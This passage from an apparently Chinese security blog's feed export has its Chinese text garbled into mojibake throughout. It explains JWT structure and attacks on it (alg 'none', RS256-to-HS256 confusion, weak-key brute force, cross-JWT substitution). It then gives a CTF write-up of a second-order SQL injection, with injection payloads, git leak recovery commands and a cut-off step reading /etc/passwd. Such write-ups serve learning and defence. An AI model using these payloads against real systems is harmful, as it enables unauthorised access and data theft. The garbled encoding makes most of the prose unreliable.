session_idï¼Œæ‰¾åˆ°å‰æœŸä¿å­˜çš„æ•°æ®ï¼Œç”±æ­¤å¾—çŸ¥ç”¨æˆ·çš„èº«ä»½ã€‚</p></blockquote><p>å¦‚æœæ˜¯æœåŠ¡å™¨é›†ç¾¤ï¼Œæˆ–è€…æ˜¯è·¨åŸŸçš„æœåŠ¡å¯¼å‘æ¶æ„ï¼Œå°±è¦æ±‚ session æ•°æ®å…±äº«ï¼Œæ¯å°æœåŠ¡å™¨éƒ½èƒ½å¤Ÿè¯»å– sessionã€‚</p><h3 id="åŸç†"><a class="header-anchor" href="#åŸç†">ğŸ­</a>åŸç†</h3><p>æœåŠ¡å™¨è®¤è¯ä»¥åï¼Œç”Ÿæˆä¸€ä¸ª JSON å¯¹è±¡(JSONPæ³¨å…¥é‡Œè®²è¿‡)ï¼Œå‘å›ç»™ç”¨æˆ·, å¦‚ä¸‹:</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;å§“å&quot;</span>: <span class="hljs-string">&quot;wenwen&quot;</span>,  <span class="hljs-attr">&quot;è§’è‰²&quot;</span>: <span class="hljs-string">&quot;ç®¡ç†å‘˜&quot;</span>,  <span class="hljs-attr">&quot;åˆ°æœŸæ—¶é—´&quot;</span>: <span class="hljs-string">&quot;2100å¹´9æœˆ16æ—¥0ç‚¹0åˆ†&quot;</span>&#125;</code></pre><p>ç”¨æˆ·ä¸æœåŠ¡ç«¯é€šä¿¡çš„æ—¶å€™ï¼Œéƒ½è¦å‘å›è¿™ä¸ª JSON å¯¹è±¡ã€‚æœåŠ¡å™¨å®Œå…¨åªé è¿™ä¸ªå¯¹è±¡è®¤å®šç”¨æˆ·èº«ä»½ã€‚ä¸ºäº†é˜²æ­¢ç”¨æˆ·ç¯¡æ”¹æ•°æ®ï¼ŒæœåŠ¡å™¨åœ¨ç”Ÿæˆè¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šåŠ ä¸Šç­¾åï¼ŒJWTé€šå¸¸æ”¾åœ¨Authorization headerä¸­ï¼Œç”¨Bearer schemaã€‚</p><pre><code class="hljs dts"><span class="hljs-symbol">Authorization:</span> Bearer <span class="hljs-params">&lt;token&gt;</span></code></pre><p>æµç¨‹ï¼š</p><p><img src="/2021/07/19/11/1.jpg" alt="1"></p><h3 id="ç»“æ„"><a class="header-anchor" href="#ç»“æ„">ğŸ­</a>ç»“æ„</h3><ul><li><p>Headerï¼ˆå¤´éƒ¨ï¼‰</p><p>tokençš„ç±»å‹ï¼ˆâ€œJWTâ€ï¼‰å’Œç®—æ³•åç§°ï¼ˆæ¯”å¦‚ï¼šHMAC SHA256æˆ–RSAç­‰ï¼‰ï¼›ç”¨Base64å¯¹è¿™ä¸ªJSONç¼–ç å°±å¾—åˆ°JWTçš„ç¬¬ä¸€éƒ¨åˆ†</p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>&#125;</code></pre></li><li><p>Payloadï¼ˆè´Ÿè½½ï¼‰</p><p>åŒ…å«å…³äºå®ä½“(é€šå¸¸æ˜¯ç”¨æˆ·)å’Œå…¶ä»–æ•°æ®çš„å£°æ˜ï¼Œå£°æ˜æœ‰ä¸‰ç§ç±»å‹ï¼š</p><ul><li><p>Registered claims : è¿™é‡Œæœ‰ä¸€ç»„é¢„å®šä¹‰çš„å£°æ˜ï¼Œä¸æ˜¯å¼ºåˆ¶çš„ï¼Œä½†æ˜¯æ¨èã€‚æ¯”å¦‚ï¼šiss (issuer), exp (expiration time), sub (subject), aud (audience)ç­‰ã€‚</p></li><li><p>Public claims : å¯ä»¥éšæ„å®šä¹‰ã€‚</p></li><li><p>Private claims : ç”¨äºåœ¨åŒæ„ä½¿ç”¨å®ƒä»¬çš„å„æ–¹ä¹‹é—´å…±äº«ä¿¡æ¯ï¼Œå¹¶ä¸”ä¸æ˜¯æ³¨å†Œçš„æˆ–å…¬å¼€çš„å£°æ˜ã€‚</p></li></ul><p>å¯¹payloadè¿›è¡ŒBase64ç¼–ç å°±å¾—åˆ°JWTçš„ç¬¬äºŒéƒ¨åˆ†ã€‚</p></li><li><p>Signatureï¼ˆç­¾åï¼‰</p><p>Signature éƒ¨åˆ†æ˜¯å¯¹å‰ä¸¤éƒ¨åˆ†çš„ç­¾åï¼Œé˜²æ­¢æ•°æ®ç¯¡æ”¹ã€‚</p><p>é¦–å…ˆï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªå¯†é’¥ï¼ˆsecretï¼‰ã€‚è¿™ä¸ªå¯†é’¥åªæœ‰æœåŠ¡å™¨æ‰çŸ¥é“ï¼Œä¸èƒ½æ³„éœ²ç»™ç”¨æˆ·ã€‚ç„¶åï¼Œä½¿ç”¨ Header é‡Œé¢æŒ‡å®šçš„ç­¾åç®—æ³•ï¼ˆé»˜è®¤æ˜¯ HMAC SHA256ï¼‰ï¼ŒæŒ‰ç…§ä¸‹é¢çš„å…¬å¼äº§ç”Ÿç­¾åã€‚</p> <pre><code class="hljs lisp">HMACSHA256(  base64UrlEncode(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +  base64UrlEncode(<span class="hljs-name">payload</span>),  secret)</code></pre><p>ç®—å‡ºç­¾åä»¥åï¼ŒæŠŠ Headerã€Payloadã€Signature ä¸‰ä¸ªéƒ¨åˆ†æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨&quot;ç‚¹&quot;ï¼ˆ<code>.</code>ï¼‰åˆ†éš”ï¼Œå°±å¯ä»¥è¿”å›ç»™ç”¨æˆ·ã€‚</p></li></ul><p>æ ¼å¼ï¼š</p><pre><code class="hljs stylus">Header<span class="hljs-selector-class">.Payload</span><span class="hljs-selector-class">.Signature</span>  <span class="hljs-comment">//ç”¨åœ†ç‚¹(.)è¿æ¥</span></code></pre><p>Header å’Œ Payload ä¸²å‹åŒ–çš„ç®—æ³•æ˜¯ Base64URLã€‚è¿™ä¸ªç®—æ³•è·Ÿ Base64 ç®—æ³•åŸºæœ¬ç±»ä¼¼ï¼Œä½†æœ‰ä¸€äº›ä¸åŒã€‚</p><p>JWT ä½œä¸ºä¸€ä¸ªä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œæœ‰äº›åœºåˆå¯èƒ½ä¼šæ”¾åˆ° URLï¼ŒBase64 æœ‰ä¸‰ä¸ªå­—ç¬¦<code>+</code>ã€<code>/</code>å’Œ<code>=</code>ï¼Œåœ¨ URL é‡Œé¢æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥è¦è¢«æ›¿æ¢æ‰ï¼š<code>=</code>è¢«çœç•¥ã€<code>+</code>æ›¿æ¢æˆ<code>-</code>ï¼Œ<code>/</code>æ›¿æ¢æˆ<code>_</code> ã€‚</p><p>å®ä¾‹ï¼š</p><p><img src="/2021/07/19/11/3.png" alt="3"></p><h3 id="ä½¿ç”¨åœºæ™¯"><a class="header-anchor" href="#ä½¿ç”¨åœºæ™¯">ğŸ­</a>ä½¿ç”¨åœºæ™¯</h3><ul><li><strong>Authorization</strong> (æˆæƒ) : è¿™æ˜¯ä½¿ç”¨JWTçš„æœ€å¸¸è§åœºæ™¯ã€‚ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼Œåç»­æ¯ä¸ªè¯·æ±‚éƒ½å°†åŒ…å«JWTï¼Œå…è®¸ç”¨æˆ·è®¿é—®è¯¥ä»¤ç‰Œå…è®¸çš„è·¯ç”±ã€æœåŠ¡å’Œèµ„æºã€‚å•ç‚¹ç™»å½•æ˜¯ç°åœ¨å¹¿æ³›ä½¿ç”¨çš„JWTçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå› ä¸ºå®ƒçš„å¼€é”€å¾ˆå°ï¼Œå¹¶ä¸”å¯ä»¥è½»æ¾åœ°è·¨åŸŸä½¿ç”¨ã€‚</li><li><strong>Information Exchange</strong> (ä¿¡æ¯äº¤æ¢) : å¯¹äºå®‰å…¨çš„åœ¨å„æ–¹ä¹‹é—´ä¼ è¾“ä¿¡æ¯è€Œè¨€ï¼ŒJSON Web Tokensæ— ç–‘æ˜¯ä¸€ç§å¾ˆå¥½çš„æ–¹å¼ã€‚å› ä¸ºJWTså¯ä»¥è¢«ç­¾åï¼Œä¾‹å¦‚ï¼Œç”¨å…¬é’¥/ç§é’¥å¯¹ï¼Œå¯ä»¥ç¡®å®šå‘é€äººå°±æ˜¯å®ƒä»¬æ‰€è¯´çš„é‚£ä¸ªäººã€‚å¦å¤–ï¼Œç”±äºç­¾åæ˜¯ä½¿ç”¨å¤´å’Œæœ‰æ•ˆè´Ÿè½½è®¡ç®—çš„ï¼Œè¿˜å¯ä»¥éªŒè¯å†…å®¹æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</li></ul><h3 id="JWTä¸Sessionçš„å·®å¼‚"><a class="header-anchor" href="#JWTä¸Sessionçš„å·®å¼‚">ğŸ­</a>JWTä¸Sessionçš„å·®å¼‚</h3><p>JWTä¸Sessionå¾ˆåƒï¼Œä½†Sessionæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œè€ŒJWTæ˜¯åœ¨å®¢æˆ·ç«¯çš„ã€‚Sessionæ–¹å¼å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æœ€å¤§é—®é¢˜åœ¨äºè¦å ç”¨å¤§é‡æœåŠ¡å™¨å†…å­˜ï¼Œå¢åŠ æœåŠ¡å™¨çš„å¼€é”€ã€‚è€ŒJWTæ–¹å¼å°†ç”¨æˆ·çŠ¶æ€åˆ†æ•£åˆ°äº†å®¢æˆ·ç«¯ä¸­ï¼Œå¯ä»¥æ˜æ˜¾å‡è½»æœåŠ¡ç«¯çš„å†…å­˜å‹åŠ›ã€‚</p><h3 id="æ”»å‡»æ‰‹æ®µ"><a class="header-anchor" href="#æ”»å‡»æ‰‹æ®µ">ğŸ­</a>æ”»å‡»æ‰‹æ®µ</h3><h4 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a class="header-anchor" href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²">ğŸ­</a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4><p>å½“æœåŠ¡ç«¯çš„ç§˜é’¥æ³„å¯†çš„æ—¶å€™ï¼ŒJWTçš„ä¼ªé€ å°±å˜å¾—éå¸¸ç®€å•å®¹æ˜“</p><h4 id="å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºâ€™noneâ€™"><a class="header-anchor" href="#å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºâ€™noneâ€™">ğŸ­</a>å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºâ€™noneâ€™</h4><p>ç­¾åç®—æ³•ç¡®ä¿æ¶æ„ç”¨æˆ·åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹JWTã€‚ä½†æ˜¯æ ‡é¢˜ä¸­çš„algå­—æ®µå¯ä»¥æ›´æ”¹ä¸ºnoneã€‚ä¸€äº›JWTåº“æ”¯æŒæ— ç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ã€‚å½“algä¸ºnoneæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ã€‚å°†algæ›´æ”¹ä¸ºnoneåï¼Œä»JWTä¸­åˆ é™¤ç­¾åæ•°æ®ï¼ˆä»…æ ‡é¢˜+â€˜.â€™+ payload +â€˜.â€™ï¼‰å¹¶å°†å…¶æäº¤ç»™æœåŠ¡å™¨</p><h4 id="å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•-å¯¹ç§°å¯†ç ç®—æ³•ï¼‰"><a class="header-anchor" href="#å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•-å¯¹ç§°å¯†ç ç®—æ³•ï¼‰">ğŸ­</a>å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•=&gt;å¯¹ç§°å¯†ç ç®—æ³•ï¼‰</h4><p>HS256ä½¿ç”¨å¯†é’¥æ¥ç­¾åå’ŒéªŒè¯æ¯ä¸ªæ¶ˆæ¯ã€‚è€ŒRS256ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œè®¤è¯ã€‚å¦‚æœå°†ç®—æ³•ä»RS256æ›´æ”¹ä¸ºHS256ï¼Œåˆ™åç«¯ä»£ç ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ç”±äºæ”»å‡»è€…æœ‰æ—¶å¯ä»¥è·å–å…¬é’¥ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥å°†æ ‡å¤´ä¸­çš„ç®—æ³•ä¿®æ”¹ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚æ­¤æ—¶ï¼Œåç«¯ä»£ç å°±ä¼šä½¿ç”¨RSAå…¬é’¥+HS256ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ï¼Œä»è€Œè®©éªŒè¯é€šè¿‡ã€‚</p><h4 id="HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£"><a class="header-anchor" href="#HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£">ğŸ­</a>HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£</h4><p>å¦‚æœHS256å¯†é’¥å¼ºåº¦è¾ƒå¼±ï¼Œåˆ™å¯ä»¥ç›´æ¥å¼ºåˆ¶ä½¿ç”¨ï¼Œé€šè¿‡çˆ†ç ´ HS256çš„ç§˜é’¥å¯ä»¥å®Œæˆè¯¥æ“ä½œã€‚éš¾åº¦æ¯”è¾ƒä½ã€‚è§£å†³å¯¹ç­–å¾ˆç®€å•ï¼Œä½¿ç”¨å¤æ‚çš„ç§˜é’¥å³å¯ã€‚</p><h4 id="é”™è¯¯çš„å †å åŠ å¯†-ç­¾åéªŒè¯å‡è®¾"><a class="header-anchor" href="#é”™è¯¯çš„å †å åŠ å¯†-ç­¾åéªŒè¯å‡è®¾">ğŸ­</a>é”™è¯¯çš„å †å åŠ å¯†+ç­¾åéªŒè¯å‡è®¾</h4><p>è¯¦è§ï¼š<a href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a></p><h4 id="æ— æ•ˆæ¤­åœ†æ›²çº¿æ”»å‡»"><a class="header-anchor" href="#æ— æ•ˆæ¤­åœ†æ›²çº¿æ”»å‡»">ğŸ­</a>æ— æ•ˆæ¤­åœ†æ›²çº¿æ”»å‡»</h4><p>åœ¨æ¤­åœ†æ›²çº¿åŠ å¯†ä¸­ï¼Œå…¬é’¥æ˜¯æ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªç‚¹ï¼Œè€Œç§é’¥åªæ˜¯ä¸€ä¸ªä½äºç‰¹æ®Šä½†éå¸¸å¤§çš„èŒƒå›´å†…çš„æ•°å­—ã€‚ å¦‚æœæœªéªŒè¯å¯¹è¿™äº›æ“ä½œçš„è¾“å…¥ï¼Œé‚£æ”»å‡»è€…å°±å¯ä»¥è¿›è¡Œè®¾è®¡ï¼Œä»è€Œæ¢å¤ç§é’¥ã€‚è¿™ç±»æ”»å‡»è¢«ç§°ä¸ºæ— æ•ˆæ›²çº¿æ”»å‡»ã€‚</p><p>è¯¦è§ï¼š<a href="http://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in-json-encryption.html">critical-vulnerability-uncovered-in-json-encryption</a></p><h4 id="æ›¿æ¢æ”»å‡»"><a class="header-anchor" href="#æ›¿æ¢æ”»å‡»">ğŸ­</a>æ›¿æ¢æ”»å‡»</h4><p>åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…éœ€è¦è‡³å°‘è·å¾—ä¸¤ç§ä¸åŒçš„JWTï¼Œç„¶åæ”»å‡»è€…å¯ä»¥å°†ä»¤ç‰Œä¸­çš„ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªç”¨åœ¨å…¶ä»–çš„åœ°æ–¹ã€‚</p><p>åœ¨JWTä¸­ï¼Œæ›¿æ¢æ”»å‡»æœ‰ä¸¤ç§æ–¹å¼ï¼šç›¸åŒæ¥æ”¶æ–¹æ”»å‡»ï¼ˆè·¨è¶Šå¼JWTï¼‰å’Œä¸åŒæ¥æ”¶æ–¹æ”»å‡»ã€‚</p><p><strong>ä¸åŒæ¥æ”¶æ–¹æ”»å‡»</strong></p><p>è®¾æƒ³ä¸€ä¸ªä¸šåŠ¡é€»è¾‘ï¼š</p><blockquote><p>Auth æœºæ„ï¼Œæœ‰ç€è‡ªå·±çš„ç§é’¥ï¼Œå¹¶ä¸”ç»™ App1 å’Œ App2 å‘æ”¾äº†ä¸¤ä¸ªå…¬é’¥ï¼Œç”¨äºéªŒè¯ç­¾åï¼›</p><p>Attacker åˆ©ç”¨è‡ªå·±çš„ç§˜é’¥ç™»å½•äº† App1ã€‚</p></blockquote><p>æ­¤æ—¶ Auth æœºæ„ç»™ Attacker ä¸‹å‘äº†ä¸€ä¸ª é™„å¸¦ç­¾åçš„JWTï¼Œå…¶payloadå†…å®¹ä¸ºï¼š</p><pre><code class="hljs 1c">&#123;    &#x27;uname&#x27;:&#x27;Attacker&#x27;    &#x27;role&#x27; :&#x27;admin&#x27;&#125;</code></pre><p>æ­¤æ—¶ï¼Œå¦‚æœ Attacker çŸ¥é“ App1 å’Œ App2 çš„å…¬é’¥æ˜¯åŒä¸€ä¸ªAuth ç­¾å‘çš„è¯ï¼Œä»–å¯ä»¥åˆ©ç”¨è¿™ä¸ªJWTå»ç™»å½• App2ï¼Œä»è€Œè·å–Adminæƒé™ã€‚</p><p><strong>ç›¸åŒæ¥æ”¶æ–¹æ”»å‡»/è·¨è¶Šå¼JWT same recipient/Cross JWT</strong></p><p>è®¾æƒ³ä¸€ä¸ªä¸šåŠ¡é€»è¾‘ï¼š</p><blockquote><p>åœ¨åŒä¸€ç«™ç‚¹ä¸‹ï¼Œæœ‰ä¸¤ä¸ªåº”ç”¨ç¨‹åºï¼Œwordpresså’Œphpmyadminï¼Œä»–ä»¬éƒ½åˆ©ç”¨äº†ç›¸åŒçš„ç§˜é’¥å¯¹å’Œç®—æ³•æ¥éªŒè¯JWTç­¾åï¼›</p><p>ç«™ç‚¹ç®¡ç†å‘˜çŸ¥é“ Different Recipient çš„é—®é¢˜ï¼Œæ‰€ä»¥ç»™ wordpress çš„åº”ç”¨å¢åŠ äº† aud éªŒè¯ï¼Œä½†æ˜¯ phpmyadmin çš„ç”¨æˆ·äººæ•°è¾ƒå°‘ï¼Œæ²¡æœ‰å¢åŠ  aud çš„éªŒè¯ï¼›</p><p>Attacker åˆ©ç”¨è‡ªå·±çš„ç§˜é’¥ç™»å½•äº† wordpressã€‚</p></blockquote><p>æ­¤æ—¶ ç«™ç‚¹ ç»™ Attacker ä¸‹å‘äº†ä¸€ä¸ª é™„å¸¦ç­¾åçš„JWTï¼Œå…¶payloadå†…å®¹ä¸ºï¼š</p><pre><code class="hljs sml">&#123;    <span class="hljs-symbol">&#x27;uname&#x27;</span>:<span class="hljs-symbol">&#x27;Attacker&#x27;</span>    <span class="hljs-symbol">&#x27;role&#x27;</span> :<span class="hljs-symbol">&#x27;writer&#x27;</span>    <span class="hljs-symbol">&#x27;aud&#x27;</span> :<span class="hljs-symbol">&#x27;shaobaobaoer</span>.cn/wordpress&#x27;    <span class="hljs-symbol">&#x27;iss&#x27;</span> :<span class="hljs-symbol">&#x27;shaobaobaoer</span>.cn&#x27;&#125;</code></pre><p>è¿™ä¸ªJWTçœ‹ä¼¼éå¸¸å®‰å…¨ï¼Œä½†è¿™ä»…ä»…æ˜¯å¯¹äº wordpress çš„åº”ç”¨ç¨‹åºè€Œè¨€ï¼Œã€‚ä»è€ŒAttacker å¯ä»¥ä»¥ writer çš„èº«ä»½ç™»å½• phpmyadminã€‚</p><h3 id="ç‰¹ç‚¹"><a class="header-anchor" href="#ç‰¹ç‚¹">ğŸ­</a>ç‰¹ç‚¹</h3><ul><li>JWT é»˜è®¤æ˜¯ä¸åŠ å¯†ã€‚</li><li>JWT ä¸åŠ å¯†çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½å°†ç§˜å¯†æ•°æ®å†™å…¥ JWTã€‚</li><li>JWT ä¸ä»…å¯ä»¥ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯ä»¥ç”¨äºäº¤æ¢ä¿¡æ¯ã€‚æœ‰æ•ˆä½¿ç”¨ JWTï¼Œå¯ä»¥é™ä½æœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“çš„æ¬¡æ•°ã€‚</li><li>ç”±äºæœåŠ¡å™¨ä¸ä¿å­˜ session çŠ¶æ€ï¼Œå› æ­¤æ— æ³•åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­åºŸæ­¢æŸä¸ª tokenï¼Œæˆ–è€…æ›´æ”¹ token çš„æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ JWT ç­¾å‘äº†ï¼Œåœ¨åˆ°æœŸä¹‹å‰å°±ä¼šå§‹ç»ˆæœ‰æ•ˆï¼Œé™¤éæœåŠ¡å™¨éƒ¨ç½²é¢å¤–çš„é€»è¾‘ã€‚</li><li>JWT æœ¬èº«åŒ…å«äº†è®¤è¯ä¿¡æ¯ï¼Œä¸€æ—¦æ³„éœ²ï¼Œä»»ä½•äººéƒ½å¯ä»¥è·å¾—è¯¥ä»¤ç‰Œçš„æ‰€æœ‰æƒé™ã€‚ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT çš„æœ‰æ•ˆæœŸåº”è¯¥è®¾ç½®å¾—æ¯”è¾ƒçŸ­ã€‚å¯¹äºä¸€äº›æ¯”è¾ƒé‡è¦çš„æƒé™ï¼Œä½¿ç”¨æ—¶åº”è¯¥å†æ¬¡å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚</li><li>ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT ä¸åº”è¯¥ä½¿ç”¨ HTTP åè®®æ˜ç ä¼ è¾“ï¼Œè¦ä½¿ç”¨ HTTPS åè®®ä¼ è¾“ã€‚</li></ul><p>å‚è€ƒï¼š</p><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token å…¥é—¨æ•™ç¨‹</a></p><p><a href="https://www.freebuf.com/articles/web/181261.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘é¼æ¯ 2018||Comment</title>
    <link href="/2021/07/17/lod/"/>
    <url>/2021/07/17/lod/</url>
    
    <content type="html"><![CDATA[<p>æ¶‰åŠçŸ¥è¯†ç‚¹</p><ul><li>äºŒæ¬¡æ³¨å…¥</li><li>gitæ³„éœ²</li><li>gitæ¢å¤</li></ul><p>è¿›å…¥é¡µé¢æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼ˆç›²çŒœäºŒæ¬¡æ³¨å…¥ï¼‰ï¼Œéœ€è¦ç™»å½•ï¼Œå¯†ç åä¸‰ä½æœªçŸ¥ï¼Œbpçˆ†ç ´</p><p><img src="/2021/07/17/lod/1.jpg" alt="1"></p><p>æ²¡æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œåå°æ‰«æï¼Œgitæ³„éœ²</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;session_start();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">&#x27;do&#x27;</span>])&#123;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>æºç ä¸å…¨</p><blockquote><p>git log --all  or  git log --reflog//æŸ¥çœ‹æ–‡ä»¶æ›´æ”¹æ—¥å¿—</p><pre><code class="hljs angelscript">&gt;commit e5b2a2443c2b6d395d06960123142bc91123148c (<span class="hljs-built_in">ref</span>s/stash)&gt;Merge: bfbdf21 <span class="hljs-number">5556e3</span>a&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">17</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   WIP on master: bfbdf21 add write_do.php&gt;commit <span class="hljs-number">5556e3</span>ad3f21a0cf5938e26985a04ce3aa73faaf&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">17</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   index on master: bfbdf21 add write_do.php&gt;commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)&gt;Author: root &lt;<span class="hljs-symbol">root@</span>localhost.localdomain&gt;&gt;Date:   Sat Aug <span class="hljs-number">11</span> <span class="hljs-number">22</span>:<span class="hljs-number">47</span>:<span class="hljs-number">29</span> <span class="hljs-number">2018</span> +<span class="hljs-number">0800</span>   add write_do.php</code></pre><p>git reset --hard xxx//xxxå³ä¸ºæ—¥å¿—è®°å½•ä¸­æœ€åæ›´æ”¹æ—¶è®°å½•åç§°æœ¬é¢˜å³ä¸º<code>e5b2a2443c2b6d395d06960123142bc91123148c</code></p></blockquote><p>å®Œæ•´ä»£ç ï¼š</p><p><img src="/2021/07/17/lod/1.png" alt="1"></p><p>è§£é¢˜ç‚¹ï¼šaddslashesè¿‡æ»¤åäº§ç”Ÿçš„<code>\</code>ä¸ä¼šè¿›å…¥æ•°æ®åº“ï¼Œ<code>'1è¿‡æ»¤åå˜æˆ\'1</code>ï¼Œè¿›å…¥åº“ä¸­å´ä»ä¸º<code>'1</code>ï¼Œå–å‡ºæ•°æ®åè¿›è¡ŒäºŒæ¬¡æ‹¼æ¥ï¼Œå³å¯é€ æˆæ³¨å…¥ã€‚</p><p>è·å–æƒé™ï¼š</p><blockquote><p>åœ¨å‘å¸–å¤„æ„é€ categoryä¸º</p><pre><code class="hljs fix"><span class="hljs-attr">&gt;&#x27;, content</span>=<span class="hljs-string">user(),/*</span></code></pre><p>åœ¨ç•™è¨€å¤„è¾“å…¥çš„contentä¸º</p><pre><code class="hljs arcade">&gt;*<span class="hljs-regexp">/#     /</span><span class="hljs-regexp">/é—­åˆpayload ä¸­å¸¦æœ‰çš„ /</span>*</code></pre><p>å¾—åˆ°</p><pre><code class="hljs vim">&gt;$sql = <span class="hljs-comment">&quot;insert into comment</span> <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>, content=user(),/*       content = <span class="hljs-string">&#x27;*/#&#x27;</span>,     bo_id = <span class="hljs-string">&#x27;$bo_id&#x27;</span><span class="hljs-comment">&quot;;</span></code></pre><p>æ³¨ï¼šè™½ç„¶category æ˜¯ç»è¿‡ addslashes è½¬ä¹‰åå†™å…¥æ•°æ®åº“çš„ï¼Œä½†æ˜¯å–å‡ºæ—¶æ˜¯æ²¡æœ‰è¢«è½¬ä¹‰çš„ï¼Œå³æ²¡æœ‰åæ–œæ çš„å› ä¸º<code>æ”¾åˆ°æ•°æ®åº“åä¼šæŠŠè½¬ä¹‰ç¬¦ \ å»æ‰ï¼ˆè¿›å…¥æ•°æ®åº“åæ˜¯æ²¡æœ‰åæ–œæ çš„ï¼‰</code>ï¼Œä½†æ˜¯åœ¨cmmentä¸­ï¼Œå¯¹äºcategoryçš„å€¼ä»æ•°æ®åº“å–å‡ºæ¥æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œç›´æ¥æ‹¼æ¥åˆ°sql insertè¯­å¥ä¸­ï¼Œè¿™å°±å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„å¯èƒ½.</p><blockquote><img src="/2021/07/17/lod/2.jpg" alt="2" style="zoom:50%;"></blockquote></blockquote><p>è¯»å–/etc/passwd</p><blockquote><p>ä¸€èˆ¬ <strong>flag</strong> ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› 